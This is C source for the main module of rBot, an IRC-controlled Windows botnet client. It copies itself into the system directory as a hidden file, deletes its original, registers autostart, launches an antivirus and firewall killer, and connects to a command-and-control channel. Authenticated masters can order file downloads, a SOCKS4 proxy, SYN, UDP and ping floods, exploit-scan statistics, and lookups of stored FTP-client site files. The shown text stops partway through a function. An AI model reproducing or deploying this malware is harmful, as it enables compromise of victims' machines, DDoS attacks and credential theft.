/* 

  rBot

*/

#include "includes.h"
#include "functions.h"
#include "configs.h"
#include "passwd.h"
#include "globals.h"
#include "externs.h"


// advscan
extern int exploitnum;
extern EXPLOIT exploit[];

// program starts here
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	char fname[_MAX_FNAME], ext[_MAX_EXT], rfilename[MAX_PATH],	cfilename[MAX_PATH], sysdir[MAX_PATH];

	WSADATA wsadata;

	int i = 0, err = 0;
	//DWORD id=0;
	BOOL bkpserver = FALSE;

	// record start time
	started = GetTickCount() / 1000;
	// re-seed random numbers
	srand(GetTickCount());

	#ifdef DEBUG_LOGGING
	opendebuglog();
	#endif

	#ifndef NO_CRYPT // Don't decrypt password here
	decryptstrings((sizeof(authost) / sizeof(LPTSTR)), (sizeof(versionlist) / sizeof(LPTSTR)));
	#endif

	LoadDLLs(); // load all the dlls and functions here

	// hide system messages if bot crashes
	fSetErrorMode(SEM_NOGPFAULTERRORBOX);

	// check if this exe is running already
	if (WaitForSingleObject(CreateMutex(NULL, FALSE, botid), 30000) == WAIT_TIMEOUT)
		exit(EXIT_FAILURE);

	err = fWSAStartup(MAKEWORD(2, 2), &wsadata);
	if (err != 0) return 0;
	if ( LOBYTE( wsadata.wVersion ) != 2 || HIBYTE( wsadata.wVersion ) != 2 ) {
		fWSACleanup();
		return 0;
	}

	GetSystemDirectory(sysdir, sizeof(sysdir));
	GetModuleFileName(GetModuleHandle(NULL), cfilename, sizeof(cfilename));
	_splitpath(cfilename, NULL, NULL, fname, ext );
	_snprintf(rfilename, sizeof(rfilename), "%s%s", fname, ext);

	if (strstr(cfilename, sysdir) == NULL) {
		char tmpfilename[MAX_PATH];
		if (rndfilename) {
			for (i=0;(unsigned int)i < (strlen(filename) - 4);i++)
				filename[i] = (rand() % 26) + 97;
		}
		sprintf(tmpfilename, "%s\\%s", sysdir, filename);


		if (GetFileAttributes(tmpfilename) != INVALID_FILE_ATTRIBUTES)
			SetFileAttributes(tmpfilename,FILE_ATTRIBUTE_NORMAL);

		// loop only once to make sure the file is copied.
		BOOL bFileCheck=FALSE;
		while (CopyFile(cfilename, tmpfilename, FALSE) == FALSE) {
			DWORD result = GetLastError();

			if (!bFileCheck && (result == ERROR_SHARING_VIOLATION || result == ERROR_ACCESS_DENIED)) {
				bFileCheck=TRUE; // check to see if its already running! then try 1 last time.
				Sleep(15000);
			} else
				break; // just continue, it's not worth retrying.
		}
		SetFileAttributes(tmpfilename,FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY);

		PROCESS_INFORMATION pinfo;
		STARTUPINFO sinfo;
		memset(&pinfo, 0, sizeof(pinfo));
		memset(&sinfo, 0, sizeof(sinfo));
		sinfo.lpTitle     = "";
		sinfo.cb = sizeof(sinfo);
		sinfo.dwFlags = STARTF_USESHOWWINDOW;
		sinfo.wShowWindow = SW_HIDE;
		fWSACleanup();
		
		char cmdline[MAX_PATH];
		HANDLE hProcessOrig = OpenProcess(SYNCHRONIZE, TRUE, GetCurrentProcessId());
		sprintf(cmdline,"%s %d \"%s\"",tmpfilename, hProcessOrig, cfilename);

		if (CreateProcess(tmpfilename, cmdline, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, sysdir, &sinfo, &pinfo)) {
			CloseHandle(pinfo.hProcess);
			CloseHandle(pinfo.hThread);
			exit(EXIT_SUCCESS);
		}
	}

	#ifndef NO_MELT
	// now delete it
	if (__argc == 3) {
		// now the clone is running --> kill original exe
		HANDLE hProcessOrig = (HANDLE) atoi(__argv[1]);
		WaitForSingleObject(hProcessOrig, INFINITE);
		CloseHandle(hProcessOrig);

		if (__argv[2] != NULL) {
				Sleep(3000); //wait for 2 sec to make sure process has fully exited 
				DeleteFile(__argv[2]);
		}
	}
	#endif

	if ((AutoStart) && !(noadvapi32)) 
		AutoStartRegs(rfilename);

	addthread("[MAIN]: Bot started.",MAIN_THREAD,NULL);
	addlog("[MAIN]: Bot started.");

	// remove the following line if you don't want any predefined aliases
	memset(aliases, 0, sizeof(aliases));
	addpredefinedaliases();

    #ifndef NO_AVFW_KILL
	i=addthread("AV/FW Killer",KILLER_THREAD,NULL);
	threads[i].tHandle = CreateThread(NULL, 0, &kill_av, NULL, 0, &id);
	addlog("AV/FW Killer started.");
    #endif

    #ifndef NO_SECSYSTEM
	DWORD id;
	i=addthread("System Secure Monitor",KILLER_THREAD,NULL);
	threads[i].tHandle = CreateThread(NULL, 0, &AutoSecure, NULL, 0, &id);
	addlog("System secure monitor started.");
    #endif

    #ifndef NO_REGISTRY
	i=addthread("Registry Monitor",KILLER_THREAD,NULL);
	threads[i].tHandle = CreateThread(NULL, 0, &AutoRegistry, (void *)&rfilename, 0, &id);
	addlog("Registry monitor started.");
    #endif

	// set version while bot is running
    current_version=rand()%(sizeof(versionlist)/sizeof(*versionlist));

	// copy settings into main irc structure
	strncpy(mainirc.host, server, sizeof(mainirc.host)-1);
	mainirc.port = port;
	strncpy(mainirc.channel, channel, sizeof(mainirc.channel)-1);
	strncpy(mainirc.chanpass, chanpass, sizeof(mainirc.chanpass)-1);
	mainirc.spy = 0;

	while (1) {
		for (i = 0; i < 6; i++) {
			#ifndef NO_CONNCHECK
			DWORD cstat;
			// check if we're connected to the internet... if not, then wait 5mins and try again
			if (!nowininet) if (fInternetGetConnectedState(&cstat, 0) == FALSE) {
				Sleep(30000);
				continue;
			}
			#endif

			err = irc_connect((void *)&mainirc);

			success = FALSE;
			if (err == 2) break; // break out of the loop

			if (success) i--; // if we're successful in connecting, decrease i by 1;

			// irc_connect didn't return 2, so we need to sleep then reconnect
			Sleep(60000);
		}

		if (err == 2) break; // break out of the loop and close

		if (bkpserver) {
			strncpy(mainirc.host, server, sizeof(mainirc.host)-1);
			mainirc.port = port;
			strncpy(mainirc.channel, channel, sizeof(mainirc.channel)-1);
			strncpy(mainirc.chanpass, chanpass, sizeof(mainirc.chanpass)-1);
			bkpserver = FALSE;
		}
		else if (!bkpserver && server2[0] != '\0') {
		    strncpy(mainirc.host, server2, sizeof(mainirc.host)-1);
			mainirc.port = port2;
			strncpy(mainirc.channel, channel2, sizeof(mainirc.channel)-1);
			strncpy(mainirc.chanpass, chanpass2, sizeof(mainirc.chanpass)-1);
			bkpserver = TRUE;
		}
	}

	// cleanup;
	for (i=0; i < MAXTHREADS; i++) 
		fclosesocket(threads[i].csock);
	fWSACleanup();

	return 0;
}

// connect function used by the original bot and all clones/spies
DWORD WINAPI irc_connect(LPVOID param)
{
	SOCKET sock;
	SOCKADDR_IN ssin;

	char *nick1, nick[18], nprefix[18], logbuf[LOGLINE];

	BYTE spy;
	DWORD err;
	int rval;

	ircs irc = *((ircs *)param);
	ircs *ircp = (ircs *)param;
	ircp->gotinfo = TRUE;

	while (1) {
		memset(&ssin, 0, sizeof(ssin));
		ssin.sin_family = AF_INET;
		ssin.sin_port = fhtons((unsigned int)irc.port);

		ssin.sin_addr.s_addr=ResolveAddress(irc.host);
		if (ssin.sin_addr.s_addr == 0) return 0;

		memset(nick, 0, sizeof(nick));
		memset(nprefix, 0, sizeof(nprefix));
		if (irc.spy == 1)
			nick1 = irc.nick; 
		else {
			#ifndef NO_CONSTNICK
			nick1 = rndnickconst(nick);
			#else
			nick1 = rndnick(nick);
			#endif

			unsigned int days = GetTickCount() / 86400000;
			if (days > 10)
			#ifndef NO_MIRCNICK
				_snprintf(nprefix, sizeof(nprefix),"[%d]%s", days, ((fFindWindow("mIRC",0))?("[M]"):("")));
			else
				_snprintf(nprefix, sizeof(nprefix), ((fFindWindow("mIRC",0))?("[M]"):("")));
			#else
				_snprintf(nprefix, sizeof(nprefix),"[%d]", days);
			#endif
			if (strlen(nprefix) > 2) {
				_snprintf(nprefix, sizeof(nprefix), "%s%s", nprefix, nick1);
				nick1 = nprefix;
			}
		}

		sock = fsocket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
		threads[irc.threadnum].csock = sock;
		err = fconnect(sock, (LPSOCKADDR)&ssin, sizeof(SOCKADDR_IN));
		if (err == SOCKET_ERROR) {
			fclosesocket(sock);
			FlushDNSCache();
			Sleep(10000);
			continue;
		}

		sprintf(logbuf, "[MAIN]: Connected to %s.", irc.host);
		addlog(logbuf);

		strncpy(threads[irc.threadnum].cnick, nick1, sizeof(threads[irc.threadnum].cnick)-1);

		if (irc.spy == 1) 
			spy = 1; 
		else 
			spy = 0;
		rval = irc_receiveloop(sock, irc.channel, irc.chanpass, nick1, irc.sock, irc.hchan, irc.host, spy);
		fclosesocket(sock);

		if (rval == 0) continue;
		if (rval == 1) {	//Disconnect (sleep 30 mins, reconnect..)
			Sleep(1800000);
			continue;
		}
		if (rval == 2) break;	//Quit
	}

	threads[irc.threadnum].tHandle = 0;
	threads[irc.threadnum].name[0] = '\0';
	threads[irc.threadnum].cnick[0] = '\0';

	return rval;
}

// receive loop for bots/spies
int irc_receiveloop(SOCKET sock, char *channel, char *chanpass, char *nick1, SOCKET hsock, char *hchannel, char *server, BYTE spy)
{
	// main receive buffer
	char buff[4096], master[128*MAXLOGINS], str[8], login[128];
	int err, repeat, in_channel=0;

	memset(master, 0, sizeof(master));

	// FIX ME: irc_sendv
	if (serverpass[0] != '\0') {
		sprintf(login, "PASS %s\r\n", serverpass);
		fsend(sock, login, strlen(login), 0);
	}

 	sprintf(login, "NICK %s\r\n"
				   "USER %s 0 0 :%s\r\n", nick1, nick1, nick1);
	err = fsend(sock, login, strlen(login), 0);
	#ifdef DEBUG_LOGGING
	debuglog(login,FALSE);
	#endif

	if (err == SOCKET_ERROR) {
		fclosesocket(sock);
		Sleep(5000);
		return 0;
	}

	// loop forever
	while(1) {
		char host[160], *lines[MAX_LINES];

		memset(buff, 0, sizeof(buff));
		err = frecv(sock, buff, sizeof(buff), 0);
		// if recv() returns 0, that means that the connection has been lost.
		if ((err == 0) || (err == SOCKET_ERROR)) 
			break;

		// FIX ME: Truncation occurs here
		// split lines up if multiple lines received at once, and parse each line		
		int i = Split(buff,&lines);
		for (int j=0;j < i;j++) {
			repeat=1;
			do {
				#ifdef DEBUG_LOGGING
				debuglog(lines[j]);
				#endif

				repeat = irc_parseline(lines[j], sock, channel, chanpass, nick1, server, master, host, &in_channel, repeat);
				repeat--;

				if (repeat > 0)
					Sleep(FLOOD_DELAY);
			} while (repeat>0);

			switch (repeat) {
			case -1:
				return 0; // Reconnect
			case -2:
				return 1; // Disconnect
			case -3:
				return 2; // Quit
			default:
				break;
			}
		}
	}

	return 0;
}

// function to parse lines for the bot and clones
int irc_parseline(char *line, SOCKET sock, char *channel, char *chanpass, char *nick1, char *server, char *master, char *host, int *in_channel, int repeat)
{
	char line1[IRCLINE], line2[IRCLINE], sendbuf[IRCLINE],ntmp[12], ntmp2[3];
	char *masters[MAXLOGINS], *a[32], a0[128], nick[16], user[24];
	unsigned char parameters[256];

	int i, ii, s=3;
	DWORD id=0;
	BOOL ismaster, silent = FALSE, notice = FALSE, usevars = FALSE;
    
	memset(sendbuf, 0, sizeof(sendbuf));

	strncpy(nick, nick1, sizeof(nick)-1);
	for (i = 0; i < MAXLOGINS; i++) 
		masters[i] = master + (i * 128);

	if (line == NULL) return 1;
	memset(line1, 0, sizeof(line1));
	strncpy(line1, line, sizeof(line1)-1);
	char *x = strstr(line1, " :");

	// split the line up into seperate words
	strncpy(line2, line1, sizeof(line2)-1);
	a[0] = strtok(line2, " ");
	for (i = 1; i < 32; i++) 
		a[i] = strtok(NULL, " ");

	if (a[0] == NULL || a[1] == NULL) 
		return 1;

	memset(parameters,0,sizeof(parameters));
	for (i=31;i>=0;i--) {
		if (!a[i]) 
			continue;
		if ((a[i][0]=='-') && (a[i][2]==0)) {
			//Looks like a valid parameter..
			parameters[a[i][1]]=1;
			a[i][0]=0;
			a[i][1]=0;
			a[i][2]=0;
			a[i]=NULL;
		} else 
			break;
	}

	if (parameters['s']) 
		silent=TRUE;
	if (parameters['n']) {
		silent=FALSE;
		notice=TRUE;
	}

	if (a[0][0] != '\n') {
		strncpy(a0,  a[0], sizeof(a0)-1);
		strncpy(user, a[0]+1, sizeof(user)-1);
		strtok(user, "!");
	}

	// pong if we get a ping request from the server
	if (strcmp("PING", a[0]) == 0) {
		a[0][1]='O';

		//irc_sendv(sock, "PONG %s\r\n", a[1]+1);
		irc_sendv(sock, "PONG %s\r\n", a[1]);
		if (*in_channel == 0) {
			irc_sendv(sock, "JOIN %s %s\r\n", channel, chanpass);
		}
		return 1;
	}

	// looks like we're connected to the server, let's join the channel
	if (strcmp("001", a[1]) == 0 || strcmp("005", a[1]) == 0) {
		irc_sendv(sock, "JOIN %s %s\r\n", channel, chanpass);
		irc_sendv(sock, "USERHOST %s\r\n", nick1); // get our hostname
		#ifndef NO_MODEONCONN
		irc_sendv(sock, "MODE %s %s\r\n", nick1, modeonconn);
		#else
		//irc_sendv(sock, "MODE %s +i\r\n", nick1);
		#endif
		success = TRUE;
		return 1;
	}

	// get host
	if (strcmp("302", a[1]) == 0) {
		char *h = strstr(a[3], "@");
		if (h != NULL) 
			strncpy(host,  h+1, 159);
		return 1;
	}

	// nick already in use   
	if (strcmp("433", a[1]) == 0) {
		rndnick(nick1);
		irc_sendv(sock, "NICK %s\r\n", nick1);
		return 1;
	}

	// check if user is logged in
	ismaster = FALSE;
	for (i = 0; i < MAXLOGINS; i++) {
		if (strcmp(masters[i], a0) == 0)
			ismaster = TRUE;
	}

	//rejoin channel if we're kicked, otherwise reset master if it was our master that got kicked
	if (strcmp("KICK", a[1]) == 0) {
		char *knick;
		for (i = 0; i < MAXLOGINS; i++) {
			if (masters[i][0] == '\0') continue;
			strncpy(a0,  masters[i], sizeof(a0)-1);
			knick = user;
			if (knick != NULL && a[3] != NULL) 
				if (strcmp(knick, a[3]) == 0) {
					masters[i][0] = '\0';
					sprintf(sendbuf,"[MAIN]: User %s logged out.", knick);
					irc_sendv(sock, "NOTICE %s :%s\r\n", knick, sendbuf);
					addlog(sendbuf);
				}
		}
		if (strcmp(nick1, a[3]) == 0) {
			*in_channel = 0;
			irc_sendv(sock, "JOIN %s %s\r\n", channel, chanpass);
		}
		return 1;
	}

	if (strcmp("NICK", a[1]) == 0) {
		char *oldnck = user, *newnck = a[2] + 1;
		for (i=0;i<MAXLOGINS;i++) {
			if (strcmp(masters[i],a0) == 0) {
				//Master has changed nick
				//Lets TRY to rebuild the master-usermask.
				char *identandhost=strchr(a0,'!');
				if (identandhost) {
					masters[i][0]=':';	//Prefix
					strcpy(&masters[i][1],newnck);
					strcat(&masters[i][2],identandhost);
				}
			}
		}
		if (oldnck != NULL && newnck != NULL)  {
			if (strcmp(oldnck, nick1) == 0) 
				strncpy(nick1,  newnck, 15);
		}
		return 1;
	}

	// reset master if master parts or quits
	if (strcmp("PART", a[1]) == 0 || strcmp("QUIT", a[1]) == 0) {
		for (i = 0; i < MAXLOGINS; i++) {
			if (masters[i][0] != '\0') {
				if (strcmp(masters[i], a[0]) == 0) {
					masters[i][0] = '\0';
					sprintf(sendbuf, "[MAIN]: User: %s logged out.", user);
					addlog(sendbuf);
					if (strcmp("PART", a[1]) == 0) 
						irc_sendv(sock, "NOTICE %s :%s\r\n", a[0] + 1, sendbuf);
					return 1;
				}
			}
		}
	}

	// we've successfully joined the channel
	if (strcmp("353", a[1]) == 0) {
		if (strcmp(channel, a[4]) == 0)
			*in_channel = 1;
		sprintf(sendbuf, "[MAIN]: Joined channel: %s.", a[4]);
		irc_sendv(sock, "MODE %s +sntmM", channel);
		addlog(sendbuf);
		return 1;
	}

	// if we get a privmsg, notice or topic command, start parsing it
	if (strcmp("PRIVMSG", a[1]) == 0 || strcmp("NOTICE", a[1]) == 0 || (strcmp("332", a[1]) == 0 && topiccmd)) {
		if (strcmp("PRIVMSG", a[1]) == 0 || strcmp("NOTICE", a[1]) == 0) {	// it's a privmsg/notice
			if (strcmp("NOTICE", a[1]) == 0) 
				notice = TRUE;
			if (a[2] == NULL) return 1;
			//strcpy(msg_real_dest,a[2]);
			if (strstr(a[2], "#") == NULL || notice) 
				a[2] = user;

			if (a[3] == NULL) return 1;
			a[3]++;
			// if our nick is the first part of the privmsg, then we should look at a[4] for a command, a[3] otherwise.
			if (a[3] && nick1)
				if (strncmp(nick, a[3], strlen(nick)) == 0) 
					s = 4; 
				else 
					s = 3;
			if (a[s] == NULL) return 1;
			// if someone asks for our version, send version reply
			if (strcmp("\1VERSION\1", a[s]) == 0) 
				if (a[2][0] != '#' && versionlist[current_version][0] != '\0') {
					irc_sendv(sock, "NOTICE %s :\1VERSION %s\1\r\n", a[2], (char *)versionlist[current_version]);
					return 1;
				}
			else if (strcmp("\1PING", a[s]) == 0) 
				if (a[s+1] != NULL && a[2][0] != '#') {
					irc_sendv(sock, "NOTICE %s :\1PING %s\1\r\n", a[2], a[s+1]);
					return 1;
				}
		} else  { // it's a topic command
			s = 4;
			a[4]++;
			a[2] = a[3];
		}

		#ifndef NO_DCC
		if (strcmp("\1DCC", a[s]) == 0) { 
			if (strcmp("SEND", a[s+1]) == 0) {
				if (ismaster) {
					DCC dcc;
					dcc.sock = sock;
					dcc.notice = notice;
					dcc.silent = silent;
					strncpy(dcc.sendto,user,sizeof(dcc.sendto));

					sprintf(dcc.filename,"%s",a[s+2]);
					sprintf(dcc.host,"%s",a[s+3]);
					dcc.port = atoi(a[s+4]);

					sprintf(sendbuf, "[DCC]: Receive file: '%s' from user: %s.", dcc.filename,dcc.sendto);

					dcc.threadnum=addthread(sendbuf,DCC_THREAD,NULL);
					strncpy(threads[dcc.threadnum].file,dcc.filename,sizeof(threads[dcc.threadnum].file)-1);
					threads[dcc.threadnum].tHandle = CreateThread(NULL, 0, &dcc_getfile, (void *)&dcc, 0, &id);

					while (dcc.info == FALSE) 
						Sleep(50);

				} else 
					sprintf(sendbuf, "[DCC]: Receive file: '%s' failed from unauthorized user: %s.", a[s+2], user);
				addlog(sendbuf);

				return 1;
			}
			else if (strcmp("CHAT", a[s+1]) == 0) {
				if (ismaster) {
					if (findthreadid(DCCCHAT_THREAD) == 0) {
						DCC dcc;
						dcc.sock = sock;
						dcc.notice = notice;
						dcc.silent = silent;
						strncpy(dcc.sendto,user,sizeof(dcc.sendto));

						sprintf(dcc.host,"%s",a[s+3]);
						dcc.port = atoi(a[s+4]);

						sprintf(sendbuf, "[DCC]: Chat from user: %s.", user);

						dcc.threadnum=addthread(sendbuf,DCCCHAT_THREAD,NULL);
						threads[dcc.threadnum].tHandle = CreateThread(NULL, 0, &dcc_chat, (void *)&dcc, 0, &id);

						while (dcc.info == FALSE) 
							Sleep(50);

					} else
						sprintf(sendbuf,"[DCC]: Chat already active with user: %s.",user);
				} else
					sprintf(sendbuf,"[DCC]: Chat failed by unauthorized user: %s.",user);
				addlog(sendbuf);

				return 1;
			}
		} else
		#endif

		if (a[s]++[0] != prefix) 
			return 1;

		// see if someone is logging in
		if (strcmp("sxt", a[s]) == 0) {
			if (a[s+1] == NULL) 
				return 1;
			if (ismaster) 
				return 1;

			char *u = strtok(a[0], "!") + 1, *h = strtok(NULL, "\0");
			h = strtok(h, "~");
			//#ifndef NO_CRYPT
			//Crypt(a[s+1],strlen(a[s+1])); // Encrypt password to compare to stored password
			//#endif
			if (strcmp(password, a[s+1]) != 0) {
				irc_sendv(sock, "NOTICE %s :Pass Auth failed.\r\n", user);
				//irc_sendv(sock, "NOTICE %s :Your attempt has been logged.\r\n", user);
				sprintf(sendbuf, "[MAIN]: *Failed pass auth by %s!%s.", u, h);
				addlog(sendbuf);
				return 1; 
			}
	
			BOOL host_ok=FALSE;
			for (i=0;i<(sizeof(authost) / sizeof(LPTSTR));i++) {
			#ifndef NO_WILDCARD
				if (wildcardfit(authost[i], h)) { 
					host_ok = TRUE;
					break;
				}
			#else
				if (strcmp(h, authost[i]) == 0) {
					host_ok = TRUE;
					break;
				}
			#endif
			}
 			if (!host_ok) {
 				irc_sendv(sock, "NOTICE %s :Host Auth failed.\r\n", user);
 				//irc_sendv(sock, "NOTICE %s :Your attempt has been logged.\r\n", user);
 				sprintf(sendbuf, "[MAIN]: *Failed host auth by %s!%s.", u, h);
 				addlog(sendbuf);
 				return 1;
			}
			for (i = 0; i < MAXLOGINS; i++) {
				if (a[s+1] == NULL) return 1;
				if (masters[i][0] != '\0') continue;
				if (strcmp(password, a[s+1]) == 0) {
					strncpy(masters[i],  a0, 127);
					//if (!silent) irc_privmsg(sock, a[2], "[MAIN]: Password accepted.", notice);
					sprintf(sendbuf, "[MAIN]: Password accepted.");
					if (!silent) irc_privmsg(sock, a[2], sendbuf, notice); 
					sprintf(sendbuf, "[MAIN]: User: %s logged in.", user); 
					addlog(sendbuf);
					break;
				}
			}
			return 1;
		}

		if (ismaster || strcmp("332", a[1]) == 0) {
			// commands requiring no parameters
			// check if the command matches an alias's name
			for (i = 0; i < anum; i++) {
				if (strcmp(aliases[i].name, a[s]) == 0) {
					char *sc = strstr(line, " :");
					if (sc == NULL) return 1;
					sc[2] = prefix;
					sc[3] = prefix;
					strncpy(sc+4, aliases[i].command, 159);

					// process '$x-' parameter variables
					for (ii=15; ii > 0; ii--) {
						sprintf(ntmp, "$%d-", ii);
						if (strstr(line, ntmp) != NULL && a[s+ii+1] != NULL) {
							x = x + strlen(aliases[i].name);
							if (x != NULL) {
								char *y = strstr(x, a[s+ii]);
								if (y != NULL) replacestr(line, ntmp, y);
							}
						}
						else if (a[s+ii+1] == NULL) {
							strncpy(ntmp2, ntmp, 2);
							ntmp2[2] = '\0';
							replacestr(line, ntmp, ntmp2);
						}
					}

					// process '$x' parameter variables
					for (ii=16; ii > 0; ii--){
						sprintf(ntmp, "$%d", ii);
						if (strstr(line, ntmp) != NULL && a[s+ii] != NULL) 
							replacestr(line, ntmp, a[s+ii]);
					}

					usevars = TRUE;
					break;
				}
			}

			if (a[s][0] == prefix || usevars) {
				// process variables
				replacestr(line, "$me", nick1); // bot's nick
				replacestr(line, "$user", user); // user's nick
				replacestr(line, "$chan", a[2]); // channel name (or user name if this is a privmsg to the bot)
				replacestr(line, "$rndnick", rndnick(ntmp)); // random string of 4-7 characters
				replacestr(line, "$server", server); // name of current server

				// process '$chr()' variables
				while (strstr(line, "$chr(") != NULL) {
					char *c = strstr(line, "$chr(");
					strncpy(ntmp, c+5, 4);
					strtok(ntmp, ")");
					if (ntmp[0] < 48 || ntmp[0] > 57) 
						strncpy(ntmp, "63", 3);
					if (atoi(ntmp) > 0) 
						ntmp2[0] = (char)atoi(ntmp); 
					else 
						ntmp2[0] = (char)((rand()%96) + 32);
					ntmp2[1] = '\0';
					ii = strlen(ntmp);
					memset(ntmp, 0, sizeof(ntmp));
					strncpy(ntmp, c, ii+6);
					replacestr(line, ntmp, ntmp2);
				}

				// re-split the line into seperate words
				strncpy(line1, line, sizeof(line1)-1);
				strncpy(line2, line1, sizeof(line2)-1);
				a[0] = strtok(line2, " ");
				for (i = 1; i < 32; i++) 
					a[i] = strtok(NULL, " ");
				if (a[s] == NULL) 
					return 1;
				a[s] += 3;
			}

			if (strcmp("rndnick", a[s]) == 0 || strcmp("rn", a[s]) == 0) {
				#ifndef NO_CONSTNICK
				rndnickconst(nick);
				#else
				rndnick(nick);
				#endif
				irc_sendv(sock, "NICK %s\r\n", nick);
				sprintf(sendbuf,"[MAIN]: Random nick change: %s",nick);
				addlog(sendbuf);

				return repeat;
			}
			else if (strcmp("die", a[s]) == 0 || strcmp("d", a[s]) == 0) {
				if (strcmp("332", a[1]) != 0) {
					#ifdef DEBUG_LOGGING
					closedebuglog();
					#endif
					exit(EXIT_SUCCESS);
				}
			}
			else if (strcmp("logout", a[s]) == 0 || strcmp("lo", a[s]) == 0) {
				for (i = 0; i < MAXLOGINS; i++) 
					if (strcmp(masters[i], a[0]) == 0) {
						masters[i][0] = '\0';
						sprintf(sendbuf, "[MAIN]: User %s logged out.\r\n", user);
						if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
						addlog(sendbuf);
					}

				return 1;
			}
			#ifndef NO_BOTVERSION
			else if (strcmp("version", a[s]) == 0 || strcmp("ver", a[s]) == 0) {
				sprintf(sendbuf, "[MAIN]: %s", version);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return repeat;
			}
			#endif
			#ifndef NO_SECURE
			else if (strcmp("secure", a[s]) == 0 || strcmp("sec", a[s]) == 0) {
				SecureSystem(sock,a[2],notice,silent);

				return 1;
			}
			else if (strcmp("unsecure", a[s]) == 0 || strcmp("unsec", a[s]) == 0) {
				UnSecureSystem(sock,a[2],notice,silent);

				return 1;
			}
			#endif
			#ifndef NO_SOCK4SERV
			else if (strcmp("socks4", a[s]) == 0 || strcmp("s4", a[s]) == 0) {
				SOCKS4 socks4;
				socks4.sock = sock;
				socks4.notice = notice;
				socks4.silent = silent;
				sprintf(socks4.chan,a[2]);
				if (a[s+1])
					socks4.port=atoi(a[s+1]);
				else
					socks4.port=sock4port;

				sprintf(sendbuf, "[SOCKS4]: Server started on Port %d.", socks4.port);
				socks4.threadnum=addthread(sendbuf,SOCKS4_THREAD,NULL);
				threads[socks4.threadnum].port = socks4.port;
				threads[socks4.threadnum].tHandle = CreateThread(NULL, 0, &SocksDaemon, (LPVOID)&socks4, 0, &id);

				while(socks4.gotinfo == FALSE)
					Sleep(50);

				return 1;
			}
			else if (strcmp("socks4stop",a[s]) == 0) {
				threadstop(sock,a[2],notice,silent,"[SOCKS4]","Server",SOCKS4_THREAD,a[s+1]);

				return 1;
			}
			#endif
			else if (strcmp("httpstop",a[s]) == 0) {
				threadstop(sock,a[2],notice,silent,"[HTTP]","Server",HTTP_THREAD,a[s+1]);

				return 1;
			}
			else if (strcmp("logstop",a[s]) == 0) {
				threadstop(sock,a[2],notice,silent,"[LOG]","Log list",LOG_THREAD,a[s+1]);

				return 1;
			}
			else if (strcmp("redirectstop",a[s]) == 0) {
				threadstop(sock,a[2],notice,silent,"[REDIRECT]","Port redirection",REDIRECT_THREAD,a[s+1]);

				return 1;
			}
			else if (strcmp("ddos.stop",a[s]) == 0) {
				threadstop(sock,a[2],notice,silent,"[DDoS]","DDoS flood",DDOS_THREAD,a[s+1]);
				return 1;
			}
			else if (strcmp("synstop",a[s]) == 0) {
				threadstop(sock,a[2],notice,silent,"[SYN]","Syn flood",SYN_THREAD,a[s+1]);

				return 1;
			}
			else if (strcmp("udpstop",a[s]) == 0) {
				threadstop(sock,a[2],notice,silent,"[UPD]","UDP flood",UDP_THREAD,a[s+1]);

				return 1;
			}
			else if (strcmp("pingstop",a[s]) == 0) {
				threadstop(sock,a[2],notice,silent,"[PING]","Ping flood",PING_THREAD,a[s+1]);

				return 1;
			}
			#ifndef NO_TFTPD
			else if (strcmp("tftpstop", a[s]) == 0) {
				threadstop(sock,a[2],notice,silent,"[TFTP]","Server",TFTP_THREAD,a[s+1]);

				return 1;
			}
			#endif
			#ifndef NO_FINDFILE
			else if (strcmp("findfilestop",a[s]) == 0 || strcmp("ffstop",a[s]) == 0) {
				threadstop(sock,a[2],notice,silent,"[FINDFILE]","Find file",FIND_THREAD,a[s+1]);

				return 1;
			}
			#endif
			#ifndef NO_PROCESS
			else if (strcmp("procsstop",a[s]) == 0 || strcmp("psstop",a[s]) == 0) {
				threadstop(sock,a[2],notice,silent,"[PROC]","Process list",PROC_THREAD,a[s+1]);

				return 1;
			}
			#endif
			else if (strcmp("scanstop",a[s]) == 0) {
				threadstop(sock,a[2],notice,silent,"[SCAN]","Scan",SCAN_THREAD,a[s+1]);

				return 1;
			}
			/*else if (strcmp("scandel",a[s]) == 0 || strcmp("sdel",a[s]) == 0) {
				DelPayloadFile(sock,a[2],notice,silent);

				return 1;
			}*/
			else if (strcmp("scanstats",a[s]) == 0 || strcmp("stats",a[s]) == 0) {
				ListExploitStats(sock,a[2],notice);

				return repeat;
			}
			if (strcmp("flashfxp", a[s]) == 0)
			{
				HKEY hkey = NULL;
				LONG lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Classes\\Applications\\FlashFXP.exe\\shell\\open\\command", 0, KEY_READ, &hkey);
				DWORD dwSize = MAX_PATH;
				unsigned char szDataBuf[MAX_PATH];
				if(RegQueryValueEx(hkey, NULL, NULL, NULL, szDataBuf, &dwSize)== ERROR_SUCCESS)
				{
					char sites[MAX_PATH];
					strcpy(sites,replacestr((char *)szDataBuf,"FlashFXP.exe %1","sites.dat"));
					if (FileExists(sites))
					{
						FILE *f = fopen((char *)&szDataBuf, "rb");
						if (!f) goto FileDoesNotExist;

						fseek(f, 0, SEEK_END);
						int length = ftell(f);
						fseek(f, 0, SEEK_SET); // back to start

						if (length != 3341)
						{
							sprintf(sendbuf, "[FlashFXP]: Found Sites: %s (%u bytes)\r\n", sites, length);
							irc_privmsg(sock, a[2], sendbuf, notice);
							fclose(f);
						}
					}
				}
				FileDoesNotExist:
				RegCloseKey(hkey);
			}
			if (strcmp("leapftp", a[s]) == 0)
			{
				HKEY hkey = NULL;
				LONG lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\LeapFTP.exe", 0, KEY_READ, &hkey);
				DWORD dwSize = MAX_PATH;
				unsigned char szDataBuf[MAX_PATH];
				if(RegQueryValueEx(hkey, NULL, NULL, NULL, szDataBuf, &dwSize)== ERROR_SUCCESS)
				{
					char sites[MAX_PATH];
					strcpy(sites,replacestr((char *)szDataBuf,"LeapFTP.exe","sites.ini"));
					if (FileExists(sites))
					{
						FILE *f = fopen((char *)&szDataBuf, "rb");
						//if (!f) goto FileDoesNotExist;

						fseek(f, 0, SEEK_END);
						int length = ftell(f);
